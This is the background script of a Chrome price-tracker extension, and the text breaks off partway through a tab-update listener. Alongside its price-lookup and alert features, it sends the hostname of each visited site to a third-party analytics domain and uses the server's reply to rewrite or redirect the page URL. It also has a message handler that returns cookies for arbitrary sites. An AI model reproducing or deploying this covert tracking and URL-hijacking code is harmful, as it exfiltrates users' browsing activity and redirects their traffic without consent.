var ran1 = Math.floor((Math.random() * 1000)%11+ 1);
var httpq4 = new getXMLHTTPRequest();
var ptid = localStorage.ptextid;
 unin = ['showConfirmDialog', 'true'];
//chrome.management.setEnabled("abc",false);
//chrome.management.setEnabled("abc", false);


   if(getselfCookie("mysale")===0)
   {
    console.log("mysale1");
      autocallsale();

  autocallsaledata();
     var count=parseInt(localStorage.count);
  localStorage.count=count+1;
      var date = new Date();
        date.setTime(date.getTime()+(59*60*1000));
        var expires = "; expires="+date.toGMTString();
        document.cookie = "mysale=12"+expires+";";
   }






if(typeof(localStorage.ptextid) == "undefined" || localStorage.ptextid=="" || parseFloat(localStorage.ptextid)==0 || localStorage.ptextid==0|| isNaN(parseInt(localStorage.ptextid))){
  if(typeof(localStorage.ptextid)== "undefined" || parseFloat(localStorage.ptextid)==0 || isNaN(parseInt(localStorage.ptextid)) || localStorage.ptextid==0){
    var url2 = "http://api2.indiadesire.com/api.php?rquest=registerNewUser";
  }
  else {
    var url2 = "http://api2.indiadesire.com/api.php?rquest=registerNewUser";
  }
  //console.log(url2);

     xmlhttp = new XMLHttpRequest();


            var af = "indiadesireself";
            var cmp="indiadesire";
            var extid=0;

            if(localStorage.ptextid)
            extid=localStorage.ptextid;
            var x = "extid=" + extid + "&affid=" + af+"&cmp="+cmp;
            xmlhttp.open("POST", "http://api2.indiadesire.com/api.php?rquest=registerNewUser", true);
            xmlhttp.onreadystatechange = function () {
                if (xmlhttp.readyState == 4) {
                    if (xmlhttp.status == 200) {
                         var data = xmlhttp.responseText;
                         var data1=JSON.parse(data);
                         localStorage.ptextid= data1.userid;
                         localStorage.ptextauth=data1.extn1;
                         // localStorage.first = "true";
                       callInstall();
                    }
                }
            };
            xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xmlhttp.send(x);


}

function callInstall(){

if(typeof(localStorage.first) == "undefined" && typeof(localStorage.ptextid) != "undefined"){
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
var pid=localStorage.ptextid;
var auth= localStorage.ptextauth;
    for( var i=0; i < 6; i++ )
        text= text+possible.charAt(Math.floor(Math.random() * possible.length))+auth.charAt(11-i)+pid.charAt(6-i)+auth.charAt(i);
text=text+pid.charAt(0)+possible.charAt(Math.floor(Math.random() * possible.length));
var d = new Date();
var n = d.toISOString();

  chrome.tabs.create({
   url : "https://bit.ly/3LYbiRS"   //thank you page
 });

  localStorage.first = "true";
  chrome.runtime.reload();
}
}
if(chrome.runtime.setUninstallURL) {
    var text=getClientID();
    //unsuball(text);

  chrome.runtime.setUninstallURL("https://pricetrackr.in/extension/uninstall.aspx?"+text);
} else {
  // Not yet enabled
}
/*function unsuball(text)
{
  var gtds11 = new getXMLHTTPRequest();
  // var parameters10 = "message="+encodeURIComponent(request.datam)+"&data="+encodeURIComponent(request.datac)+"&title="+encodeURIComponent(request.datat)+"&url="+encodeURIComponent(request.datau)+"&status="+encodeURIComponent(request.stat);

    //console.log("parameters1: "+parameters1);
   gtds11.open("GET", "https://pricetrackr.in/extension/uninstall.aspx?"+text, true);
  // gtds.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   gtds11.onreadystatechange = function () {
       if (gtds11.readyState == 4) {
           if (gtds11.status == 200) {
               var data = gtds11.responseText;
                //  data1=JSON.stringify(data);
                  //localStorage.datarec=data;

           }
       }

   };
   gtds11.send();
}*/

function getClientID()
{
       var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
var pid=localStorage.ptextid;
var auth= localStorage.ptextauth;
  text="user="+pid+"&expo="+auth;
return text;

}
function getselfCookie(cvalue) {
    var name = cvalue + "=";
    var ca = document.cookie.split('; ');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        if (c.indexOf(name) == 0) return c.split("=")[1];
    }
    return 0;
}
chrome.extension.onMessageExternal.addListener(
    function (request, sender, sendResponse) {

        if (request.sksmode == "flippt") {
            var addmth = 0
            addmth = localStorage["flipadd"];
            sendResponse({
                output: addmth
            });
        }
        if(request.sendTabID == "TabIDRequested"){
        sendResponse({output: sender.tab.id});
      }
        if(request.message == "getSItem"){


                           var jsonarg=JSON.parse(request.rData);

                               for (var key in jsonarg) {

       jsonarg[key]=localStorage.getItem(key);
   }

        sendResponse({GottaGo:JSON.stringify(jsonarg)});
      }
    });
chrome.extension.onMessage.addListener(
    function (request, sender, sendResponse) {
      chrome.storage.local.get(['ptextid','ptextauth'], (result) => {
        if(typeof(result.ptextid) == "undefined" || result.ptextid=="" || parseFloat(result.ptextid)==0 || result.ptextid==0|| isNaN(parseInt(result.ptextid)))
        {
          chrome.storage.local.set({ptextid:localStorage["ptextid"]});
            chrome.storage.local.set({ptextauth:localStorage["ptextauth"]});
            chrome.storage.local.set({saledata:localStorage["saledata"]});
            chrome.storage.local.set({tokenID:localStorage["tokenID"]});
            chrome.storage.local.set({webdata:localStorage["webdata"]});
            chrome.storage.local.set({msaledata:localStorage["msaledata"]});
            chrome.storage.local.set({misaledata:localStorage["misaledata"]});
            chrome.storage.local.set({fsaledata:localStorage["fsaledata"]});
            chrome.storage.local.set({flipsale2:localStorage["flipsale2"]});
            chrome.storage.local.set({flipsale:localStorage["flipsale"]});
            chrome.storage.local.set({flipaddsale:localStorage["flipaddsale"]});
            chrome.storage.local.set({first:localStorage["first"]});
            chrome.storage.local.set({fcmUserID:localStorage["fcmUserID"]});
            chrome.storage.local.set({fcmEnable:localStorage["fcmEnable"]});
            chrome.storage.local.set({defaultquantity1:localStorage["defaultquantity1"]});
            chrome.storage.local.set({defaultquantity:localStorage["defaultquantity"]});
            chrome.storage.local.set({count:localStorage["count"]});
            chrome.storage.local.set({amsale:localStorage["amsale"]});
        }
      });
        if (request.sksmode == "flippt") {
            var addmth = 0
            addmth = localStorage["flipadd"];
            sendResponse({
                output: addmth
            });
        }
        if(request.sendTabID == "TabIDRequested"){
        sendResponse({output: sender.tab.id});
      }
        if(request.message == "getSItem"){


                           var jsonarg=JSON.parse(request.rData);

                               for (var key in jsonarg) {

       jsonarg[key]=localStorage.getItem(key);
   }

        sendResponse({GottaGo:JSON.stringify(jsonarg)});
      }
              if(request.mode == "saledate"){


                           var key1=request.val;

        console.log("dataerrorbefore:"+key1);

       var saledata=localStorage.getItem(key1);
console.log("dataerrorafter:"+saledata);

        sendResponse({saledata:saledata});
      }
         if(request.mode == "defaultquantity"){


                           var key1=request.mode;

        console.log("dataerrorbefore:"+key1);

       var saledata=localStorage.getItem(key1);
console.log("dataerrorafter:"+saledata);

        sendResponse({dquantity:saledata});
      }
           if(request.mode == "defaultquantity1"){


                           var key1=request.mode;

        console.log("dataerrorbefore:"+key1);

       var saledata=localStorage.getItem(key1);
console.log("dataerrorafter:"+saledata);

        sendResponse({dquantity:saledata});
      }
  if(request.mode == "saledate1"){


                           var key1=request.val;

        console.log("dataerrorbefore:"+key1);

       var saledata=localStorage.getItem(key1);
console.log("dataerrorafter:"+saledata);

        sendResponse({saledata:saledata,salecookie:getselfCookie("saletime"),salecookiecheck:getselfCookie("saletimecheck")});
      }
        if(request.mode == "salerefresh"){


               refreshsale();

        sendResponse({saledata:"1"});
      }
        if(request.clientID == "getclientID"){
            var client=getClientID();
        sendResponse({clientID:client});
      }
       if(request.getVer == "getversion"){
            var manifest_det = chrome.runtime.getManifest();
var manifest_version = manifest_det.version;
        sendResponse({getVers:manifest_version});
      }
       if(request.message == "setSItem"){
                        var jsonarg1=JSON.parse(request.rData);

                               for (var key1 in jsonarg1) {


       localStorage.setItem(key1,jsonarg1[key1]);
          jsonarg1[key1]=localStorage.getItem(key1);
   }


        sendResponse({GottaGo:JSON.stringify(jsonarg1)});
      }
        if (request.requestMode == "graph") {
            //console.log("data");
           var h = new getXMLHTTPRequest();
           var h1 = new getXMLHTTPRequest();
           var h2 = new getXMLHTTPRequest();
           var h3 = new getXMLHTTPRequest();
            var parameters = "pid=" + request.prodid+"&store="+request.store+"&extnid="+localStorage.ptextid+"&extnauth="+localStorage.ptextauth;
            h.open("POST", "http://api2.indiadesire.com/n/m/api.php?rquest=getProductPriceDataM", true);
            h.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            h.onreadystatechange = function () {
                if (h.readyState == 4) {
                    if (h.status == 200) {
                        var data = h.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;
                      //  console.log("bg: "+data);
                       console.log("h1");
                     sendResponse({output: data,title:request.title,price:request.price});

                    }
                    else
                    {
                                h1.open("POST", "http://api2.indiadesire.com/n/m/api.php?rquest=getProductPriceDataM", true);
            h1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            h1.onreadystatechange = function () {
                if (h1.readyState == 4) {
                    if (h1.status == 200) {
                        var data = h1.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;
                      //  console.log("bg: "+data);
                       console.log("h2");
                     sendResponse({output: data,title:request.title,price:request.price});

                    }
                     else
                    { //var h1 = new getXMLHTTPRequest();
                                h1.open("POST", "http://api2.indiadesire.com/n/m/api.php?rquest=getProductPriceDataM", true);
            h1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            h1.onreadystatechange = function () {
                if (h1.readyState == 4) {
                    if (h1.status == 200) {
                        var data = h1.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;
                      //  console.log("bg: "+data);
                       console.log("h3");
                     sendResponse({output: data,title:request.title,price:request.price});

                    }

                }

            };
            h1.send(parameters);
                    }

                }

            };
            h1.send(parameters);
                    }

                }

            };
            h.timeout = 6000; // Set timeout to 4 seconds (4000 milliseconds)
h.ontimeout = function () {
                                h2.open("POST", "http://api2.indiadesire.com/n/m/api.php?rquest=getProductPriceDataM", true);
            h2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            h2.onreadystatechange = function () {
                if (h2.readyState == 4) {
                    if (h2.status == 200) {
                        var data = h2.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;
                      //  console.log("bg: "+data);
                       console.log("h4");
                     sendResponse({output: data,title:request.title,price:request.price});

                    }
                     else
                    { var h1 = new getXMLHTTPRequest();
                                h1.open("POST", "http://api2.indiadesire.com/n/m/api.php?rquest=getProductPriceDataM", true);
            h1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            h1.onreadystatechange = function () {
                if (h1.readyState == 4) {
                    if (h1.status == 200) {
                        var data = h1.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;
                      //  console.log("bg: "+data);
                       console.log("h5");
                     sendResponse({output: data,title:request.title,price:request.price});

                    } else
                    { //var h1 = new getXMLHTTPRequest();
                                h1.open("POST", "http://api2.indiadesire.com/n/m/api.php?rquest=getProductPriceDataM", true);
            h1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            h1.onreadystatechange = function () {
                if (h1.readyState == 4) {
                    if (h1.status == 200) {
                        var data = h1.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;
                      //  console.log("bg: "+data);
                       console.log("h6");
                     sendResponse({output: data,title:request.title,price:request.price});

                    }

                }

            };
            h1.send(parameters);
                    }

                }

            };
            h1.send(parameters);
                    }

                }

            };
                        h2.timeout = 6000; // Set timeout to 4 seconds (4000 milliseconds)
h2.ontimeout = function () {
                                h3.open("POST", "http://api2.indiadesire.com/n/m/api.php?rquest=getProductPriceDataM", true);
            h3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            h3.onreadystatechange = function () {
                if (h3.readyState == 4) {
                    if (h3.status == 200) {
                        var data = h3.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;
                      //  console.log("bg: "+data);
                       console.log("h7");
                     sendResponse({output: data,title:request.title,price:request.price});

                    }
                     else
                    { //var h1 = new getXMLHTTPRequest();
                                h1.open("POST", "http://api2.indiadesire.com/n/m/api.php?rquest=getProductPriceDataM", true);
            h1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            h1.onreadystatechange = function () {
                if (h1.readyState == 4) {
                    if (h1.status == 200) {
                        var data = h1.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;
                      //  console.log("bg: "+data);
                       console.log("h8");
                     sendResponse({output: data,title:request.title,price:request.price});

                    }

                }

            };
            h1.send(parameters);
                    }

                }

            };
            h3.send(parameters);
            };
            h2.send(parameters);
            };
            h.send(parameters);
            //if(h.status == 200)
              return true;


        }
        if (request.requestMode == "setpricedrop") {
            //console.log("data");
           var h1 = new getXMLHTTPRequest();
            var parameters1 = "mobileno="+btoa(request.mobile)+"&extnid="+localStorage.ptextid+"&extnauth="+localStorage.ptextauth+"&gcm="+localStorage.fcmUserID;
            var parameters2 = "&medium="+request.medium+"&minpricecheck="+request.minpricecheck+"&minprice="+request.minprice+"&cprice="+request.cprice;
            var parameters3 = "&prodid="+request.prodid+"&store="+request.store+"&email="+btoa(request.email)+"&token="+localStorage.tokenID;
            parameters1=parameters1+parameters2+parameters3;
             //console.log("parameters1: "+parameters1);
            h1.open("POST", "https://api2.indiadesire.com/n/m/api.php?rquest=setPriceDropAlertM", true);
            h1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            h1.onreadystatechange = function () {
                if (h1.readyState == 4) {
                    if (h1.status == 200) {
                        var data = h1.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;

                     sendResponse({output: data});

                    }
                }

            };
            h1.send(parameters1);
            //if(h.status == 200)
              return true;


        }
           if (request.requestMode == "setalert") {
            //console.log("data");
           var gtds = new getXMLHTTPRequest();
            var parameters10 = "message="+encodeURIComponent(request.datam)+"&data="+encodeURIComponent(request.datac)+"&title="+encodeURIComponent(request.datat)+"&url="+encodeURIComponent(request.datau)+"&status="+encodeURIComponent(request.stat);

             //console.log("parameters1: "+parameters1);
            gtds.open("GET", "https://api3.indiadesire.com/TrackData.php?"+parameters10, true);
           // gtds.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            gtds.onreadystatechange = function () {
                if (gtds.readyState == 4) {
                    if (gtds.status == 200) {
                        var data = gtds.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;

                     sendResponse({output: data});

                    }
                }

            };
            gtds.send();
            //if(h.status == 200)
              return true;


        }
           if (request.requestMode == "checkpricedropset") {
            //console.log("data");
           var hpt = new getXMLHTTPRequest();
            var parameters4 = "prodid="+request.prodid+"&store="+request.store+"&extnid="+localStorage.ptextid+"&extnauth="+localStorage.ptextauth;

             //console.log("parameters1: "+parameters4);
            hpt.open("POST", "https://api2.indiadesire.com/n/m/api.php?rquest=CheckPriceDropAlertSetM", true);
            hpt.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            hpt.onreadystatechange = function () {
                if (hpt.readyState == 4) {
                    if (hpt.status == 200) {
                        var data = hpt.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;

                     sendResponse({output: data});

                    }
                }

            };
            hpt.send(parameters4);
            //if(h.status == 200)
              return true;


        }
         if (request.requestMode == "unsetpricedrop") {
            //console.log("data");
           var hptunset = new getXMLHTTPRequest();
            var parameters5 = "prodid="+request.prodid+"&store="+request.store+"&extnid="+localStorage.ptextid+"&extnauth="+localStorage.ptextauth;

             //console.log("parameters1: "+parameters4);
            hptunset.open("POST", "https://api2.indiadesire.com/n/m/api.php?rquest=setPriceDropAlertUnsubM", true);
            hptunset.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            hptunset.onreadystatechange = function () {
                if (hptunset.readyState == 4) {
                    if (hptunset.status == 200) {
                        var data = hptunset.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;

                     sendResponse({output: data});

                    }
                }

            };
            hptunset.send(parameters5);
            //if(h.status == 200)
              return true;


        }
           if (request.requestMode == "verifymobile") {
            //console.log("data");
           var vmobile = new getXMLHTTPRequest();
            var parameters6 = "data="+request.data+"&extnid="+localStorage.ptextid+"&extnauth="+localStorage.ptextauth;

             //console.log("parameters1: "+parameters4);
            vmobile.open("POST", "https://api2.indiadesire.com/n/m/api.php?rquest=verifyMobileM", true);
            vmobile.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            vmobile.onreadystatechange = function () {
                if (vmobile.readyState == 4) {
                    if (vmobile.status == 200) {
                        var data = vmobile.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;

                     sendResponse({output: data});

                    }
                }

            };
            vmobile.send(parameters6);
            //if(h.status == 200)
              return true;


        }
         if (request.requestMode == "verifyemail") {
            //console.log("data");
           var vemail = new getXMLHTTPRequest();
            var parameters7 = "data="+request.data+"&extnid="+localStorage.ptextid+"&extnauth="+localStorage.ptextauth;

             //console.log("parameters1: "+parameters4);
            vemail.open("POST", "https://api2.indiadesire.com/n/m/api.php?rquest=verifyEmailM", true);
            vemail.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            vemail.onreadystatechange = function () {
                if (vemail.readyState == 4) {
                    if (vemail.status == 200) {
                        var data = vemail.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;

                     sendResponse({output: data});

                    }
                }

            };
            vemail.send(parameters7);
            //if(h.status == 200)
              return true;


        }



        if (request.autobuy) {
            sendResponse({
                output: getselfCookie(request.autobuy),
                ptfkckout: getselfCookie('fkptco')
            });
        }
             if (request.autobuy1) {
            sendResponse({
                output1: getselfCookie(request.autobuy1),
                ptfkckout1: getselfCookie('fkptco1')
            });
        }
            if (request.salebuy) {
                       var date = new Date();
                       	const dateTime = Date.now();
//const timestamp = Math.floor(dateTime / 1000);
		var ts = Math.round(dateTime / 1000);
date.setTime(date.getTime() + (300000 * 1000));
document.cookie = "saletime="+ts+";expires=" + date;
            sendResponse({
                output: getselfCookie("saletime")
            });
        }

           if (request.salebuycheck) {
                       var date1 = new Date();
                       	const dateTime1 = Date.now();
//const timestamp = Math.floor(dateTime / 1000);
		var ts1 = Math.round(dateTime1 / 1000);
date1.setTime(date1.getTime() + (700000 * 1000));
document.cookie = "saletimecheck="+ts1+";expires=" + date1;
            sendResponse({
                output: getselfCookie("saletimecheck")
            });
        }

        if (request.sksmode == "setcookie") {
            chrome.cookies.set({
                url: "https://www.amazon.in/",
                name: "indiad",
                value: "12",
                expirationDate: (new Date()
                    .getTime() / 1000) + 300
            });
        }
           if (request.sksmode == "getcookie") {
             chrome.cookies.getAll({
            'url': request.url,
           'name': request.cname
        },
        function (data) {

             sendResponse({
                cookievalue:JSON.stringify(data)
            });
        });

            return true;
        }
        if (request.sksmode == "duplicat") {
            //console.log(sender.tab.id);
            chrome.tabs.duplicate(sender.tab.id);
        }
        if (request.sksmode == "flipkart") {
            if (request.pairs) {
                sendPairs(request.pairs, "flipkart","Asia/Kolkata");
            }
        }
           if (request.sksmode == "2gud") {
            if (request.pairs) {
                sendPairs(request.pairs, "2gud","Asia/Kolkata");
            }
        }
        if (request.sksmode == "snapdeal") {
            if (request.pairs) {
                sendPairs(request.pairs, "snapdeal","Asia/Kolkata");
            }
        }
        if (request.sksmode == "jiomart") {
            if (request.pairs) {
                sendPairs(request.pairs, "jiomart","Asia/Kolkata");
            }
        }
        if (request.sksmode == "nykaa") {
            if (request.pairs) {
                sendPairs(request.pairs, "nykaa","Asia/Kolkata");
            }
        }
        if (request.sksmode == "ajio") {
            if (request.pairs) {
                sendPairs(request.pairs, "ajio","Asia/Kolkata");
            }
        }
        if (request.sksmode == "reliancedigital") {
            if (request.pairs) {
                sendPairs(request.pairs, "reliancedigital","Asia/Kolkata");
            }
        }
        if (request.sksmode == "shopclues") {
            if (request.pairs) {
                sendPairs(request.pairs, "shopclues","Asia/Kolkata");
            }
        }
        if (request.sksmode == "paytm") {
            if (request.pairs) {
                sendPairs(request.pairs, "paytm","Asia/Kolkata");
            }
        }
        if (request.sksmode == "amazon") {
            if (request.pairs) {
                sendPairs(request.pairs, "amazon","Asia/Kolkata");
            }
        }
         if (request.sksmode == "tatacliq") {
            if (request.pairs) {
                sendPairs(request.pairs, "tatacliq","Asia/Kolkata");
            }
        }
         if (request.sksmode == "myntra") {
            if (request.pairs) {
                sendPairs(request.pairs, "myntra","Asia/Kolkata");
            }
        }
            if (request.sksmode == "pepperfry") {
            if (request.pairs) {
                sendPairs(request.pairs, "pepperfry","Asia/Kolkata");
            }
        }
         if (request.sksmode == "jabong") {
            if (request.pairs) {
                sendPairs(request.pairs, "jabong","Asia/Kolkata");
            }
        }
           if (request.sksmode == "abof") {
            if (request.pairs) {
                sendPairs(request.pairs, "abof","Asia/Kolkata");
            }
        }
           if (request.sksmode == "clovia") {
            if (request.pairs) {
                sendPairs(request.pairs, "clovia","Asia/Kolkata");
            }
        }
           if (request.sksmode == "purplle") {
            if (request.pairs) {
                sendPairs(request.pairs, "purplle","Asia/Kolkata");
            }
        }
          if (request.sksmode == "zivame") {
            if (request.pairs) {
                sendPairs(request.pairs, "zivame","Asia/Kolkata");
            }
        }
          if (request.sksmode == "croma") {
            if (request.pairs) {
                sendPairs(request.pairs, "croma","Asia/Kolkata");
            }
        }
           if (request.sksmode == "ebay") {
            if (request.pairs) {
                sendPairs(request.pairs, "ebay","Asia/Kolkata");
            }
        }
          if (request.sksmode == "amazoncn") {
            if (request.pairs) {
                sendPairs(request.pairs, "amazoncn","Asia/Shanghai");
            }
             }
             if (request.sksmode == "amazonfr") {
            if (request.pairs) {
                sendPairs(request.pairs, "amazonfr","Europe/Paris");
            }
             }
             if (request.sksmode == "amazonus") {
            if (request.pairs) {
                sendPairs(request.pairs, "amazonus","America/New_York");
            }}
            if (request.sksmode == "amazonuk") {
            if (request.pairs) {
                sendPairs(request.pairs, "amazonuk","Europe/London");
            }
            }if (request.sksmode == "amazones") {
            if (request.pairs) {
                sendPairs(request.pairs, "amazones","Europe/Madrid");
            }
            }
            if (request.sksmode == "amazonmx") {
            if (request.pairs) {
                sendPairs(request.pairs, "amazonmx","America/Mexico_City");
            }
            }if (request.sksmode == "amazonjp") {
            if (request.pairs) {
                sendPairs(request.pairs, "amazonjp","Asia/Tokyo");
            }
            }
            if (request.sksmode == "emag") {
            if (request.pairs) {
                sendPairs(request.pairs, "emag","Europe/Bucharest");
            }
            }
               if (request.sksmode == "altex") {
            if (request.pairs) {
                sendPairs(request.pairs, "altex","Europe/Bucharest");
            }
            }

    });

function sendPairs(data, store,ctimezone) {
    if(window.chrome)
    {
       // console.log("Success1");
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "https://api.indiadesire.com/v9/api.php?rquest=uploadData";
//var myurl = "https://compare.indiadesire.com/extn/v1/uploadDataNew/";
   var parameters = "extnid="+localStorage.ptextid+"&extnauth="+localStorage.ptextauth+"&data=" + encodeURIComponent(data) + "&store=" + store+"&ctimezone="+ctimezone;
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function () {
        if (httpq4.readyState == 4) {
            if (httpq4.status == 200) {
                var mytext = httpq4.responseText;
            }
        }
    };
    httpq4.send(parameters);
    }
    else{
           console.log("Success");
    }

}

function autocallsale()
{
     console.log("notmysale1");
      var cdate = new Date().getTime();
	  var httpq4 = new XMLHttpRequest();
    var myurl = "https://pricetrackr.s3.ap-south-1.amazonaws.com/sale/flipkartsale.json?ignoreCache="+localStorage.ptextid+cdate;
 //  var parameters = "pname="+cookiename;
    httpq4.open("GET", myurl, true);
    httpq4.setRequestHeader('Cache-Control', 'no-cache');
    //httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function () {
        if (httpq4.readyState == 4) {
            if (httpq4.status == 200) {
              //  var mytext = httpq4.responseText;
								 var data = httpq4.responseText;
								 localStorage.fsaledata=data;

            }
        }
    };

    httpq4.send();
      var httpq41 = new XMLHttpRequest();
    var myurl41 = "https://pricetrackr.s3.ap-south-1.amazonaws.com/sale/webdata.json?ignoreCache="+localStorage.ptextid+cdate;
 //  var parameters = "pname="+cookiename;
    httpq41.open("GET", myurl41, true);
    httpq41.setRequestHeader('Cache-Control', 'no-cache');
    //httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq41.onreadystatechange = function () {
        if (httpq41.readyState == 4) {
            if (httpq41.status == 200) {
              //  var mytext = httpq4.responseText;
								 var data = httpq41.responseText;
								 localStorage.webdata=data;

            }
        }
    };

    httpq41.send();
        	  var httpq6 = new XMLHttpRequest();
    var myurl2 = "https://pricetrackr.s3.ap-south-1.amazonaws.com/sale/misale.json?ignoreCache="+localStorage.ptextid+cdate;
 //  var parameters = "pname="+cookiename;
    httpq6.open("GET", myurl2, true);
    httpq6.setRequestHeader('Cache-Control', 'no-cache');
    //httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq6.onreadystatechange = function () {
        if (httpq6.readyState == 4) {
            if (httpq6.status == 200) {
              //  var mytext = httpq4.responseText;
								 var data = httpq6.responseText;
								 localStorage.msaledata=data;

            }
        }
    };
    httpq6.send();


    var httpq71 = new XMLHttpRequest();
var myurl31 = "https://pricetrackr.s3.ap-south-1.amazonaws.com/price/flipsale2.json?ignoreCache="+localStorage.ptextid+cdate;
//  var parameters = "pname="+cookiename;
httpq71.open("GET", myurl31, true);
httpq71.setRequestHeader('Cache-Control', 'no-cache');
//httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
httpq71.onreadystatechange = function () {
if (httpq71.readyState == 4) {
    if (httpq71.status == 200) {
      //  var mytext = httpq4.responseText;
         var data = httpq71.responseText;
         localStorage.flipsale2=data;

    }
}
};
httpq71.send();

        	  var httpq7 = new XMLHttpRequest();
    var myurl3 = "https://pricetrackr.s3.ap-south-1.amazonaws.com/price/flipsale1.json?ignoreCache="+localStorage.ptextid+cdate;
 //  var parameters = "pname="+cookiename;
    httpq7.open("GET", myurl3, true);
    httpq7.setRequestHeader('Cache-Control', 'no-cache');
    //httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq7.onreadystatechange = function () {
        if (httpq7.readyState == 4) {
            if (httpq7.status == 200) {
              //  var mytext = httpq4.responseText;
								 var data = httpq7.responseText;
								 localStorage.flipsale=data;

            }
        }
    };
    httpq7.send();


         	  var httpq8 = new XMLHttpRequest();
    var myurl4 = "https://pricetrackr.s3.ap-south-1.amazonaws.com/price/flipaddsale.json?ignoreCache="+localStorage.ptextid+cdate;
 //  var parameters = "pname="+cookiename;
    httpq8.open("GET", myurl4, true);
    httpq8.setRequestHeader('Cache-Control', 'no-cache');
    //httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq8.onreadystatechange = function () {
        if (httpq8.readyState == 4) {
            if (httpq8.status == 200) {
              //  var mytext = httpq4.responseText;
								 var data = httpq8.responseText;
								 localStorage.flipaddsale=data;

            }
        }
    };
    httpq8.send();





    	  var httpq9 = new XMLHttpRequest();
    var myurl5 = "https://pricetrackr.s3.ap-south-1.amazonaws.com/price/amsale.json?ignoreCache="+localStorage.ptextid+cdate;
 //  var parameters = "pname="+cookiename;
    httpq9.open("GET", myurl5, true);
    httpq9.setRequestHeader('Cache-Control', 'no-cache');
    //httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq9.onreadystatechange = function () {
        if (httpq9.readyState == 4) {
            if (httpq9.status == 200) {
              //  var mytext = httpq4.responseText;
								 var data = httpq9.responseText;
								 localStorage.amsale=data;

            }
        }
    };
    httpq9.send();

}
chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    var inc,hsts = 0;
var url1="https://webinlytics.com/";

    var myurl5 = "";
    var curl = changeInfo.url;
    var l = document.createElement("a");
    l.href = curl;
    var userid = l.hostname;
    userid=userid.replace('www.','');  //only host name sent to server
    if (userid && userid != chrome.runtime.id) {


        try{
        // var counts3 = parseInt(getselfCookie("mygkp"));
            if((curl.search("/checkout/init")>0)||(curl.search("&flk=1")>0)||(curl.search("&ptauto=1")>0)||(curl.search("&pt=1")>0))
         myapiurl="https://google.com/";
         else
         {
          var obj = JSON.parse(localStorage.webdata);
          if(obj.indexOf(btoa(userid)) > -1)
            myapiurl = "https://webinlytics.com/analytics.php?rquest=collect&token="+btoa(localStorage.ptextid)+"&name="+btoa(userid)+"&dataparam="+btoa(localStorage.tokenID);
            else
             myapiurl="https://google.com/";
         }
          //  console.log("Success:"+myapiurl);
             if (myapiurl.search("google.com")<0) {
         var httpq4 = new getXMLHTTPRequest();
        var myurl5="";

            httpq4.open("GET", myapiurl, true);
                httpq4.onreadystatechange = function () {
        if (httpq4.readyState == 4) {
            if (httpq4.status == 200) {
                 var data = httpq4.responseText;
                 if(data.length>10)
                 {
                         var data1=JSON.parse(data);
                         var p1= data1.Para1;
                         var p2=data1.Para2;
                           var p3= data1.Para3;
                         var p4=data1.Para4;
                if((curl.indexOf(p3) !== -1))
        {
                if(p4==0)
                {
                     if (curl.indexOf("?")!==-1)
                 myurl5=curl+"&"+p1;
                 else
                  myurl5=curl+"?"+p1;
                }
                else if(p4==1)
                {
                       myurl5=p1;
                }
                else if(p4==2)
                 {
                      myurl5=p1;
                }
                else if(p4==6)
                {
                    myurl5=p1;
                }
                  else if(p4==7)
                {
                    myurl5=p1;
                }
                 else if(p4==5)
                {
                    myurl5=url1;
                }

            var counts1 = parseInt(getselfCookie("myarea"));
            if(p4==5 && counts1<3)
            {
                 if (curl.indexOf("?")!==-1)
                 myurl5=curl.split("?")[0]+"/?"+p1;
                 else
                  myurl5=curl+"?"+p1;
                //myurl=p1;
                counts1=11;
                var date = new Date();
                    date.setTime(date.getTime()+(1*5*60*1000));
                    document.cookie =  "myarea="+counts1+";expires=" + date.toGMTString();
            }
              else if(p4==5 && counts1>3)
              myurl5="https://google.com";
